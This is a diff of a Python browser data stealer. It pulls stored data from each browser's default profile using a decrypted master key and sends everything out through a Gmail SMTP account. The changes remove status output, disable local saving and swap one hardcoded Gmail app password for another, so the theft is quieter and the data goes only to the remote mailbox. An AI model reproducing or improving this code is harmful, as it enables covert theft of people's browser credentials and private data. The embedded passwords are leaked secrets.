@@ -76,9 +76,6 @@ def save_results(browser_name, type_of_data, content):
         os.mkdir(browser_name)
     if content is not None:
         open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
-        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
-    else:
-        print(f"\t [-] No Data Found!")
 
 
 def get_data(path: str, profile: str, key, type_of_data):
@@ -128,7 +125,7 @@ def send_data(body):
     server.starttls()
 
     # Inicia sesión con tu cuenta de Gmail
-    server.login(email_sender, 'fsyz fnhh xbix vsoq')
+    server.login(email_sender, 'fprq magm rtib psvl')
 
     # Envía el mensaje
     server.send_message(msg)
@@ -153,13 +150,9 @@ if __name__ == '__main__':
         #print(f"Getting Stored Details from {browser}")
         ALLDATA += f"=========={browser}========="
         for data_type_name, data_type in data_queries.items():
-            try:
-                getting = data_type_name.replace('_', ' ').capitalize()
-                #print(f"\t [!] Getting {getting}")
-                data = get_data(browser_path, "Default", master_key, data_type)
-                ALLDATA += data
-                save_results(browser, data_type_name, data)
-                #print("\t------\n")
-            except:
-                #print(f"something went wrong with {browser} -> {getting}")
+            getting = data_type_name.replace('_', ' ').capitalize()
+            #print(f"\t [!] Getting {getting}")
+            data = get_data(browser_path, "Default", master_key, data_type)
+            ALLDATA += data
+            #save_results(browser, data_type_name, data)
     send_data(ALLDATA)
